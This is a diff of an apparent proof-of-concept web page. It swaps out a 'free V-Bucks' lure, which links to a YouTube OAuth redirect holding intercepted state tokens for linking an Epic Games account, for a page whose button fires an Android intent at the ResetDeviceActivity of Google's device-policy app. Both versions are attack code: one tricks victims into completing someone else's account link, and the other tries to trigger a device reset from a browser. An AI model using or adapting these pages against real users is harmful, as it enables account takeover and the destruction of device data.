@@ -1,10 +1,99 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Intent Launcher</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #f1f5f9;
+      color: #1e293b;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 400px;
+      padding: 30px 24px;
+      text-align: center;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 12px;
+    }
+
+    p {
+      color: #64748b;
+      line-height: 1.6;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: #2563eb;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #1d4ed8;
+    }
+
+    #status {
+      margin-top: 16px;
+      font-size: 13px;
+    }
+  </style>
+</head>
+
 <body>
-    <h2>Click here for free V-Bucks!</h2>
-    <!-- Paste the URL you intercepted here -->
-    <a href="com.google.android.apps.youtube://oauth2redirect?redirect_state=AOtJLdGfYC8lHCNipdBqW378IHSCOAASXWQHzG8_l8ejrw9trlPeiXBi7O3S-InEuB67xt0ixA2YF8iqoGBJWuK-Dadie021aCpbVsxl1qISoMcPDQ_77gbQa0nAf6-Z3JFlr3VQXszZLmSiU63uah1ExU7N6y-hqJkynO7JLFzKAmTqlg5-6m38LxFaYRjYB_FRsbcUt_6xjV6IA6NH6S0NOZrLYPdNCwq2-CJnkiRAKDt1dNHvq7KqnfxGeXigaH08ZQmGmbKpsKiOp5HyDMNYtSLvM2zdIsDALHwDnJi1O-5oTvsMfcBUZS4-ImnvXS3cRj3nasS9d7g-BkO06WNqWcRG_t5HKN3s72_B3kVhTkb8cS6GwCgFGbV0AcDEia9NrVMO9f9sMLhiSgUNqAUhnWkoVXeQAV6CahjDTpAijjzsdWIeSwK0-XKs83Vo9GsWqqJ_3CbIoUjzlUjWiNlJ3hCsbd9LG1hh-MQyuDh8Mq4GZsYQv8439-k8nRdA4wRP_OWm2JvZ8fBrhqqOa5-XvBxqDSnU5Ck7E-RR619pKxbUTbn3-IDs9YpABU8G-8GtVhq8rsvKYlpb_N1LFdE-WpLmrIrF5s-SiWt-0dhzycT8bb0wX8bPRdst6zcio0vKl49jIriZ0-5XDb5Z&state=AOtJLdGTBleDvl0z3wR7GAKVa1Lagh5zgIbGEshtFFTl07KHCJEFeuHLX32_EWxfqkaSnU3Ixo_Fz2kqZAnuznH5Idtppjp_MqqkeaW7QQB2B7-XoqRMT6H_qyMdzMOu0DsUbbXmcME2qsmRkrO1iw2AruqrmpC4d5cvMtNU1zSQY3VnTT4myUpsSBV-sageEPXdNzhyEP24eOdWpWzkakLySIWA9_l67iMvIdwQ9pQNrxksOX9JGJTyipZ_ogKqUWCOr8Fa0A5Lpliy9WJ7dw1fytmeW9OHdlsS5P7YZ8pRZV-08EhnCmdHB_JkkCdlKO5xzTqwzRcplnunOCyyL96C1tJWXIcM5GbU9WNUMYAjcLGwPYBr8xEmzYQMUIQNRA59dpuZoGzHFaiyK3FJCirVdtaMTEF4U-1CkKjvlQ5juuXd_9Ttq9-KMB9IkqFssFINUUhwPUa1oq0MmHt_mdHExZxQI0_tmEoWd_DV2O6aHSVhyMQnO6vYNwNQNJ5IDUmW_pupq2P5uMb8HSRyIYA_EzOiFiqqvf4eKLef7bjEo1KPqPBdlU_eIoSkRZ5K3L7nusc&service=epicgames.com">
-       <button style="padding:50px; font-size:40px;">Claim Reward!</button>
-    </a>
+  <main class="container">
+    <h1>Android Intent Launcher</h1>
+
+    <p>
+      Tap the button below to attempt to open the Android
+      device-management activity.
+    </p>
+
+    <button type="button" onclick="launchIntent()">
+      Open Android Activity
+    </button>
+
+    <p id="status" role="status">
+      Ready
+    </p>
+  </main>
+
+  <script>
+    function launchIntent() {
+      const status = document.getElementById("status");
+
+      status.textContent = "Attempting to open the activity...";
+
+      window.location.href =
+        "intent:#Intent;sel;component=com.google.android.apps.work.clouddpc/.base.managedprovisioning.provisioning.ResetDeviceActivity;end";
+    }
+  </script>
 </body>
 </html>
